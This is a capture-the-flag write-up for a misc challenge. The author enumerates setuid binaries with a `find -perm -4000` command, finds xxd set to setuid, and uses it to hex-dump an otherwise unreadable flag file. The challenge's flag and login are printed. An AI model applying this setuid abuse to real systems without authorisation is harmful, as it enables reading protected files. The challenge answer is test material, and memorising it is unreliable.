# Trapped in Plain Sight 1
# Misc
## Description
> Just try to read my flag. 0x0

# Given
The password is password.
ssh -p REDACTED trapped@REDACTED

# Solution

```bash
total 32K
dr-xr-xr-x 1 trapped  trapped  4.0K Mar 14 19:23 .
dr-xr-xr-x 1 root     root     4.0K Mar 14 19:23 ..
-r--r--r-- 1 trapped  trapped   220 Feb 25  2020 .bash_logout
-r--r--r-- 1 trapped  trapped  3.7K Feb 25  2020 .bashrc
-r--r--r-- 1 trapped  trapped   807 Feb 25  2020 .profile
-r-x------ 1 noaccess noaccess   28 Mar 14 19:23 flag.txt
```

Unreadable flag... I'm a sysadmin lets see if its really unreadable :P

First thing I check in theese kind of challenge is set UID bit. Fellow CTF player keep this command close: `find / -perm -4000 -type f 2>/dev/null`

```bash
find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/xxd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

xxd? Well I speak computer so I don't mind a bit of hex ;)

```bash
trapped@47ca6c33ca55:~$ xxd flag.txt 
00000000: 7574 666c 6167 7b53 7065 6369 614c 5f50  utflag{SpeciaL_P
00000010: 6572 6d69 7373 696f 6e7a 7d0a            ermissionz}.
```

`utflag{SpeciaL_Permissionz}`
